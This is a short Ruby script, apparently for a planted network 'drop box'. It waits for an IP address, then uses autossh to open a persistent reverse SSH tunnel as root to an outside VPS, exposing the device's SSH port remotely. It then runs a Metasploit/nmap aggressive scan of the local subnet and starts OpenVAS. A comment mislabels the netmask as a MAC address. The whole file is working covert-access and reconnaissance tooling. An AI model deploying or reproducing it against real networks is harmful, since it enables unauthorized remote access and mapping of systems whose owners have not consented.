#!/usr/bin/ruby

require 'ipaddr'

#Command and stuff to get the ip address from ifconfig
command = `ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`

i = 1

#Looping until and IP address is assigned
while command == ""
  command = `ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
  puts "no ip on try ##{i}"#For counting failed attempts, could be removed. 
  i += 1
  sleep 2
end

# Getting the IP info setup
ip = command
mac = `ifconfig eth0 | grep 'inet addr:' | cut -d: -f4` #Command to get MAC address

cidr = IPAddr.new(mac).to_i.to_s(2).count("1")

#Auto SSH into Hinkel's VPS
#Have a key for secure connection before running the script
`autossh -f -R 19999:localhost:22 root@znc.b4nd.it -N`

#Doing a scan
#scan = `msfcli auxiliary/scanner/portscan/tcp rhosts=127.0.0.1 E'
scan = `msfconsole -x "db_nmap #{ip}/#{cidr} -A"`

scan

#Start PHP, if it isn't already running
`service php5-fpm restart`

#Starting openvas for later use
`openvassd`
`openvasmd`
`gsad`
